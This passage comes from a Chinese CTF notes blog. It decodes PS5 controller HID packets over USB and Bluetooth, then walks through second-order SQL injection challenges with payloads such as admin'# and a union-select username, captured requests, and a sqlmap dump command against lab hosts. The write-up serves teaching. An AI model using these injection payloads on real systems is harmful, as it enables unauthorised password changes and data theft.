class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Triangle&quot;</span> <span class="hljs-keyword">if</span> triangle_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(hat_direction <span class="hljs-keyword">if</span> hat_direction <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;L1&quot;</span> <span class="hljs-keyword">if</span> l1_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;R1&quot;</span> <span class="hljs-keyword">if</span> r1_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;L2&quot;</span> <span class="hljs-keyword">if</span> l2_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;R2&quot;</span> <span class="hljs-keyword">if</span> r2_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Create&quot;</span> <span class="hljs-keyword">if</span> create_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Options&quot;</span> <span class="hljs-keyword">if</span> options_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;L3&quot;</span> <span class="hljs-keyword">if</span> l3_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;R3&quot;</span> <span class="hljs-keyword">if</span> r3_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PS&quot;</span> <span class="hljs-keyword">if</span> ps_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Touchpad&quot;</span> <span class="hljs-keyword">if</span> touchpad_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mute&quot;</span> <span class="hljs-keyword">if</span> mute_button <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 示例数据包的十六进制字符串表示</span><br>hex_string = <span class="hljs-string">&quot;01827d828000003c23000000ee8d076ffffffeff00001c007d1fe8042ed60f03ff80000000800000000005040000000000f0ea0f032918008a72a3693ff4dec1&quot;</span><br><br><span class="hljs-comment"># 解码并输出按键</span><br>decode_hid_data(hex_string)<br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ps5/1714097200269-beab6828-54ea-4561-bdde-fe8039bdcd1d.png" alt="image.png"></p><h3 id="蓝牙流量分析"><a href="#蓝牙流量分析" class="headerlink" title="蓝牙流量分析"></a>蓝牙流量分析</h3><p>这里的map跟usb的稍有不同，但规则是一样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript">byte <span class="hljs-number">0</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Report</span> <span class="hljs-variable constant_">ID</span> - <span class="hljs-number">8</span> bits<br>    always <span class="hljs-number">0x01</span><br>byte <span class="hljs-number">1</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / X - <span class="hljs-number">8</span> bits - left stick X axis<br>    <span class="hljs-attr">left</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">2</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / Y - <span class="hljs-number">8</span> bits - left stick Y axis<br>    <span class="hljs-attr">up</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">down</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">3</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / Z - <span class="hljs-number">8</span> bits - right stick X axis<br>    <span class="hljs-attr">left</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">4</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Rz</span> - <span class="hljs-number">8</span> bits - right stick Y axis<br>    <span class="hljs-attr">up</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">down</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">5</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Hat</span> <span class="hljs-keyword">switch</span> - <span class="hljs-number">4</span> bits - directional buttons<br>    <span class="hljs-attr">neutral</span>: <span class="hljs-number">0x8</span>, <span class="hljs-attr">N</span>: <span class="hljs-number">0x0</span>, <span class="hljs-attr">NE</span>: <span class="hljs-number">0x1</span>, <span class="hljs-attr">E</span>: <span class="hljs-number">0x2</span>, <span class="hljs-attr">SE</span>: <span class="hljs-number">0x3</span>, <span class="hljs-attr">S</span>: <span class="hljs-number">0x4</span>, <span class="hljs-attr">SW</span>: <span class="hljs-number">0x5</span>, <span class="hljs-attr">W</span>: <span class="hljs-number">0x6</span>, <span class="hljs-attr">NW</span>: <span class="hljs-number">0x7</span><br>byte <span class="hljs-number">5</span>, bit <span class="hljs-number">4</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x01</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Square</span> button<br>byte <span class="hljs-number">5</span>, bit <span class="hljs-number">5</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x02</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Cross</span> button<br>byte <span class="hljs-number">5</span>, bit <span class="hljs-number">6</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x03</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Circle</span> button<br>byte <span class="hljs-number">5</span>, bit <span class="hljs-number">7</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x04</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Triangle</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x05</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">L1</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">1</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x06</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">R1</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">2</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x07</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">L2</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">3</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x08</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">R2</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">4</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x09</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Create</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">5</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0a</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Options</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">6</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0b</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">L3</span> button<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">7</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0c</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">R3</span> button<br>byte <span class="hljs-number">7</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0d</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">PS</span> button<br>byte <span class="hljs-number">7</span>, bit <span class="hljs-number">1</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0e</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Touchpad</span> button<br>byte <span class="hljs-number">7</span>, bit <span class="hljs-number">2</span>: <span class="hljs-title class_">Vendor</span> defined <span class="hljs-number">0xFF00</span> / <span class="hljs-number">0x21</span> - <span class="hljs-number">6</span> bits<br>byte <span class="hljs-number">8</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Rx</span> - <span class="hljs-number">8</span> bits - <span class="hljs-variable constant_">L2</span> axis<br>    <span class="hljs-attr">neutral</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">pressed</span>: <span class="hljs-number">0xff</span><br>byte <span class="hljs-number">9</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Ry</span> - <span class="hljs-number">8</span> bits - <span class="hljs-variable constant_">R2</span> axis<br>    <span class="hljs-attr">neutral</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">pressed</span>: <span class="hljs-number">0xff</span><br></code></pre></td></tr></table></figure><p>这里同样可以用<a href="https://github.com/nondebug/dualsense/blob/main/dualsense-explorer.html">https://github.com/nondebug/dualsense/blob/main/dualsense-explorer.html</a><br>本地搭建就可以了<br><img src="/mdimg/ps5/1714098979964-d3de7934-0c5c-4a15-adb0-cf4013b166ba.png" alt="image.png"><br>此时我按下了L1按键，可以看到<br><code>31 41 81 81 83 80 00 00 01 08 01 00 00</code> 第10byte发生了变化<br>这里的第0 byte是31 而<code>byte 0, bit 0: Report ID - 8 bits  always 0x01</code><br>貌似有点对不上，wireshark抓包看看（管理员运行）<br>wireshark抓蓝牙不要选蓝牙网络连接（抓不到数据）<br><img src="/mdimg/ps5/1714099878610-8207f65d-a298-4894-854b-4732347b3bf3.png" alt="image.png"><br>选择usbpcap1并勾选 bluetooth<br><img src="/mdimg/ps5/1714099789441-d56ddf61-d7cc-4bc2-b107-ab3bbfe090e0.png" alt="image.png"><br>往下拉可以看到手柄设备<br><img src="/mdimg/ps5/1714099752516-d12517ac-3c32-4482-87d8-877e2d0afe5d.png" alt="image.png"><br><img src="/mdimg/ps5/1714100165598-7c8f0473-c7ad-47d5-a308-96ff5e205075.png" alt="image.png"><br>抓包时我按下的是L1，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">   <span class="hljs-number">31</span> <span class="hljs-number">41</span> <span class="hljs-number">81</span> <span class="hljs-number">81</span> <span class="hljs-number">83</span> <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">08</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>a1 <span class="hljs-number">31</span> e1 <span class="hljs-number">80</span> <span class="hljs-number">81</span> <span class="hljs-number">83</span> <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">08</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 9ee81a8afbffb4fca901aa0c371ee8fabd8741de0f800000008000000000040400000000331d8d41de070400bcae8b7492ff450e0000000000000000008a6f3839<br></code></pre></td></tr></table></figure><p>可以看到input数据跟上面测试程序的数据是一样的<br>这跟<a href="https://github.com/nondebug/dualsense?tab=readme-ov-file">https://github.com/nondebug/dualsense?tab=readme-ov-file</a>里蓝牙input为10byte 不对应<br><img src="/mdimg/ps5/1714100421461-41c0f80a-7e78-47f7-bbcf-2e152eff0056.png" alt="image.png"><br>而且在流里面没发现设备名称，貌似无法像usb那样识别出设备<br>以下是根据测试程序写的map<br>Sample Bluetooth input report, all inputs neutral (10 bytes):<br><code>31 41 81 81 83 80 00 00 01 08 01 00 00</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript">byte <span class="hljs-number">0</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Report</span> <span class="hljs-variable constant_">ID</span> - <span class="hljs-number">8</span> bits<br>    always <span class="hljs-number">0x31</span><br>byte <span class="hljs-number">2</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / X - <span class="hljs-number">8</span> bits - left stick X axis<br>    <span class="hljs-attr">left</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">3</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / Y - <span class="hljs-number">8</span> bits - left stick Y axis<br>    <span class="hljs-attr">up</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">down</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">4</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / Z - <span class="hljs-number">8</span> bits - right stick X axis<br>    <span class="hljs-attr">left</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">right</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">5</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Rz</span> - <span class="hljs-number">8</span> bits - right stick Y axis<br>    <span class="hljs-attr">up</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">down</span>: <span class="hljs-number">0xff</span>, <span class="hljs-attr">neutral</span>: ~<span class="hljs-number">0x80</span><br>byte <span class="hljs-number">9</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Hat</span> <span class="hljs-keyword">switch</span> - <span class="hljs-number">4</span> bits - directional buttons<br>    <span class="hljs-attr">neutral</span>: <span class="hljs-number">0x8</span>, <span class="hljs-attr">N</span>: <span class="hljs-number">0x0</span>, <span class="hljs-attr">NE</span>: <span class="hljs-number">0x1</span>, <span class="hljs-attr">E</span>: <span class="hljs-number">0x2</span>, <span class="hljs-attr">SE</span>: <span class="hljs-number">0x3</span>, <span class="hljs-attr">S</span>: <span class="hljs-number">0x4</span>, <span class="hljs-attr">SW</span>: <span class="hljs-number">0x5</span>, <span class="hljs-attr">W</span>: <span class="hljs-number">0x6</span>, <span class="hljs-attr">NW</span>: <span class="hljs-number">0x7</span><br>byte <span class="hljs-number">9</span>, bit <span class="hljs-number">4</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x01</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Square</span> button<br>byte <span class="hljs-number">9</span>, bit <span class="hljs-number">5</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x02</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Cross</span> button<br>byte <span class="hljs-number">9</span>, bit <span class="hljs-number">6</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x03</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Circle</span> button<br>byte <span class="hljs-number">9</span>, bit <span class="hljs-number">7</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x04</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Triangle</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x05</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">L1</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">1</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x06</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">R1</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">2</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x07</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">L2</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">3</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x08</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">R2</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">4</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x09</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Create</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">5</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0a</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Options</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">6</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0b</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">L3</span> button<br>byte <span class="hljs-number">10</span>, bit <span class="hljs-number">7</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0c</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">R3</span> button<br>byte <span class="hljs-number">11</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0d</span> - <span class="hljs-number">1</span> bit - <span class="hljs-variable constant_">PS</span> button<br>byte <span class="hljs-number">11</span>, bit <span class="hljs-number">1</span>: <span class="hljs-title class_">Button</span> / <span class="hljs-number">0x0e</span> - <span class="hljs-number">1</span> bit - <span class="hljs-title class_">Touchpad</span> button<br>byte <span class="hljs-number">7</span>, bit <span class="hljs-number">2</span>: <span class="hljs-title class_">Vendor</span> defined <span class="hljs-number">0xFF00</span> / <span class="hljs-number">0x21</span> - <span class="hljs-number">6</span> bits<br>byte <span class="hljs-number">6</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Rx</span> - <span class="hljs-number">8</span> bits - <span class="hljs-variable constant_">L2</span> axis<br>    <span class="hljs-attr">neutral</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">pressed</span>: <span class="hljs-number">0xff</span><br>byte <span class="hljs-number">7</span>, bit <span class="hljs-number">0</span>: <span class="hljs-title class_">Generic</span> <span class="hljs-title class_">Desktop</span> / <span class="hljs-title class_">Ry</span> - <span class="hljs-number">8</span> bits - <span class="hljs-variable constant_">R2</span> axis<br>    <span class="hljs-attr">neutral</span>: <span class="hljs-number">0x00</span>, <span class="hljs-attr">pressed</span>: <span class="hljs-number">0xff</span><br><br></code></pre></td></tr></table></figure><p>就是按键byte里的bit规则不变但是数据的byte位变了</p><p>蓝牙协议还未详细深入学习，至此，下播了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次注入</title>
    <link href="/2024/04/23/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/04/23/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>用户跟程序交互时，通过注册，修改密码等操作将数据存入数据库中，如果没有进行过滤或者只是简单的转义后就写入到数据库中，假如用户输入恶意sql语句造成sql语句的拼接和截断，就会造成越权或者sql注入。</p><p>二次注入是存储型注入，二次注入一般出现在注册和修改密码等处</p><p>例如修改密码的sql语句是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$ sql = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;$ pass&#x27; where username=&#x27;$ username&#x27; and password=&#x27;$ curr_pass&#x27; &quot;</span>;<br></code></pre></td></tr></table></figure><p>我传入的username为<code>admin&#39;#</code><br>那么语句就会变成</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$ sql = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘#’ and password=’$ curr_pass’ &quot;</span>;<br></code></pre></td></tr></table></figure><p>实际上执行的是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$ sql = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘</span><br></code></pre></td></tr></table></figure><p>那么就可以越权修改admin的密码了</p><p>例题1<br>注册账号，无过滤</p><h3 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h3><p>开局有一个注册的跳转<br>随便注册一个进去发现没有利用的地方<br>尝试构造语句<br>注册 用户名1’ union select 666 #   密码123 登录<br><img src="/mdimg/eczr/1713877125276-d15ca93a-c553-4ab0-9149-6180eb8535a3.png" alt="image.png"><br>发现回显<br>没有过滤，直接联合查询找到flag在flag表<br>最终payload  1 ‘union select flag from flag #  123</p><p>例题2<br>修改密码，无过滤</p><h3 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h3><p>随便注册一个账号登录<br>发现/update路由修改密码<br>查看源码</p><!-- update user set password='%s' where username='%s'; --><p>注册一个<code>admin&#39;--+</code>#账号<br>然后登录<code>admin&#39;--+</code><br><strong>点击修改密码</strong><br><strong>修改成功后admin的密码被修改了，这里相对于执行</strong>update user set password=’%s’ where username=’admin’–+’;<br><strong>登录admin</strong><br>抓个查询的包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /query <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: node4.<span class="hljs-property">anna</span>.<span class="hljs-property">nssctf</span>.<span class="hljs-property">cn</span>:<span class="hljs-number">28167</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Referer: http://node4.anna.nssctf.cn:28167/home</span><br><span class="hljs-comment">Origin: http://node4.anna.nssctf.cn:28167</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zie6ig.W2qNyQXizv2MXtqtjL4v-8M4oGM</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Content-Length: 4</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">id=1</span><br></code></pre></td></tr></table></figure><p><code>sqlmap -r 1.txt --batch --random-agent  -T flag -C flag --dump</code></p><p>例题3</p><p>登录改密越权，无过滤</p><h3 id="湖湘杯-2021-final-Penetratable"><a href="#湖湘杯-2021-final-Penetratable" class="headerlink" title="[湖湘杯 2021 final]Penetratable"></a>[湖湘杯 2021 final]Penetratable</h3><p>尝试一下发现是双引号闭合<br>注册 <code>**admin&quot;#**</code><br><strong>登录</strong><br><img src="/mdimg/eczr/1713927810056-a4b1d285-0e8f-4624-882f-c14d86f56049.png" alt="image.png"><br>发现这里name直接显示的是admin，二次注入成功<br>修改密码然后登录admin，这里c的参数变成admin了<br><img src="/mdimg/eczr/1713927915883-59e27381-71cb-47f2-8428-370b87031072.png" alt="image.png"><br>发现admin并没有什么东西<br>想起刚开始的页面<br><img src="/mdimg/eczr/1713928048547-e6f3f6b2-ae8f-4f58-852a-d169870e750a.png" alt="image.png"><br>猜测要root账户登录<br>如法炮制<br>注册root”#<br>但是在修改密码时发现没有权限<br><img src="/mdimg/eczr/1713928171058-75ecb206-49f2-4629-9a85-1369300b9748.png" alt="image.png"><br>抓包发现了更新密码的路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /?c=admin&amp;m=updatePass <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: node4.<span class="hljs-property">anna</span>.<span class="hljs-property">nssctf</span>.<span class="hljs-property">cn</span>:<span class="hljs-number">28896</span><br><span class="hljs-title class_">Accept</span>-<span class="hljs-title class_">Encoding</span>: gzip, deflate<br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span>: application/x-www-form-urlencoded; charset=<span class="hljs-variable constant_">UTF</span>-<span class="hljs-number">8</span><br><span class="hljs-title class_">Accept</span>: text/plain, *<span class="hljs-comment">/*; q=0.01</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Origin: http://node4.anna.nssctf.cn:28896</span><br><span class="hljs-comment">Referer: http://node4.anna.nssctf.cn:28896/?c=user</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: PHPSESSID=26ad8fbd4be248b8b3beb898d494838e</span><br><span class="hljs-comment">Content-Length: 119</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">name=cm9vdA==&amp;newPass=63a9f0ea7bb98050796b649e85481845&amp;oldPass=b2ca678b4c936f905fb82f2733f5297f&amp;saying=cm9vdA%3D%3D</span><br></code></pre></td></tr></table></figure><p><code>cm9vdA==</code>root  base64<br><img src="/mdimg/eczr/1713929311512-75169787-dda4-43b7-80b4-bc9b196a98db.png" alt="image.png"><br>要之前管理员的cookie<br><img src="/mdimg/eczr/1713929466248-539f44e3-ffc3-4203-88b4-482906a5ed63.png" alt="image.png"><br>登录root<br>在管理下载处发现文件遍历路由<br><img src="/mdimg/eczr/1713929856268-604723f4-7fd5-4b1f-a33f-6ba5c63afd3f.png" 